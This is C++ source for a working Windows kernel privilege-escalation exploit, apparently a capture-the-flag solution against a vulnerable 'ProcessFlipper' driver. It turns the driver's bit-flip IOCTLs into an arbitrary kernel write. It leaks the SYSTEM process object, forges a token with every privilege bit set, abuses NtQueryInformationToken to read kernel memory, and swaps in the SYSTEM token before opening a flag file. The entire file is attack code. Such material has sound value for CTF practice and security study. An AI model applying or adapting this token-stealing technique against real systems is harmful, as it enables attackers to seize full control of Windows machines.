#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <array>

#include "init.h"

#define IOCTL_TURN_ON_BIT  0x222004
#define IOCTL_TURN_OFF_BIT 0x222008

HANDLE hDevice = 0;
DWORD readMe[10];
PNtQueryInformationToken ntQueryInformationToken;

void init();
void arbWrite(int offset, DWORD64 val, DWORD size);

DWORD64 leakEproc(DWORD pid) {
	ULONG len = 0x500000;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

		status = ntQuerySystemInformation((SYSTEM_INFORMATION_CLASS)64, pHandleInfo, len, &len);

	} while (status == (NTSTATUS)0xc0000004);

	for (int i = 0; i < pHandleInfo->HandleCount; i++) {
		if (pHandleInfo->Handles[i].UniqueProcessId == (HANDLE)pid)
			return (DWORD64)pHandleInfo->Handles[i].Object;
	}
	return 0;
}



int main() {
	init();

	// --- pwn me
	DWORD64 systemEproc = 0;

	DWORD64 fakeToken = (DWORD64)VirtualAlloc((LPVOID)0x1000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (fakeToken != 0x1000000) {
		puts("[-] VirtualAlloc failed");
		return -1;
	}
	DWORD64 tokenLock = (DWORD64)VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD64 fakeBuf = (DWORD64)VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD64 fakeSid = (DWORD64)VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD64 anotherFake = (DWORD64)VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD64 hehe = (DWORD64)VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	arbWrite(0x248, 0x1000038, 8);
	// --- faking token
	*(DWORD64*)(fakeToken) = 0x10;
	*(DWORD64*)(fakeToken + 0x30 + 0x30) = tokenLock;	// bypassing
	*(DWORD64*)(fakeToken + 0x30 + 0x480) = fakeBuf;	// arb read buffer
	*(DWORD64*)(fakeToken + 0x30 + 0x98) = fakeSid;		// bypassing
	*(DWORD64*)(fakeToken + 0x30 + 0x40) = 0xffffffffffffffff;	// enable SeDebugPrivilege
	*(DWORD64*)(fakeToken + 0x30 + 0x48) = 0xffffffffffffffff;	// enable SeDebugPrivilege
	*(DWORD64*)(fakeToken + 0x30 + 0x50) = 0xffffffffffffffff;	// enable SeDebugPrivilege
	
	// --- sid bypassing
	*(DWORD64*)(fakeSid) = anotherFake;		// bypassing
	*(DWORD64*)(anotherFake) = hehe;		// bypassing

	// --- faking arb read buf
	*(WORD*)   (fakeBuf + 0x2a) = 0x10;		// fake size
	systemEproc = leakEproc(4);
	*(DWORD64*)(fakeBuf + 0x30) = (DWORD64)(systemEproc + 0x248);		// fake buffer
	
	
	ULONG returnLen = 0;
	BYTE tokenInfo[0x100] = { 0 };
	ntQueryInformationToken(GetCurrentProcessToken(), TokenBnoIsolation, (PVOID)tokenInfo, 0x100, &returnLen);

	DWORD64 systemToken = *(DWORD64*)(tokenInfo + 0x10);
	arbWrite(0x248, systemToken, 8);

	system("notepad.exe C:\\flag.txt");
	
	return 1;
}

void arbWrite(int offset, DWORD64 val, DWORD size) {
	BYTE inputBuf[0x10] = { 0 };

	for (int i = 0; i < size; i++) {
		BYTE cVal = ((val >> (8 * i)) & 0xff);

		for (int j = 0; j < 8; j++) {
			*(DWORD64*)inputBuf = ((offset + i) << 3) + j;

			if (((cVal >> j) & 1) != 0)
				DeviceIoControl(hDevice, IOCTL_TURN_ON_BIT, inputBuf, 4, NULL, NULL, NULL, NULL);
			else DeviceIoControl(hDevice, IOCTL_TURN_OFF_BIT, inputBuf, 4, NULL, NULL, NULL, NULL);
		}
	}
}

void init() {
	hDevice = CreateFile(L"\\\\.\\ProcessFlipper", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		puts("[-] CreateFile failed");
		exit(-1);
	}

	HANDLE curr_proc_hdl = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));

	ntQueryInformationToken = (PNtQueryInformationToken)GetProcAddress(ntdll, "NtQueryInformationToken");
	if (ntQueryInformationToken == 0) exit(-1);

	if (initNTFunction() == -1) {
		puts("[-] initNTFunction failed");
		exit(-1);
	}
}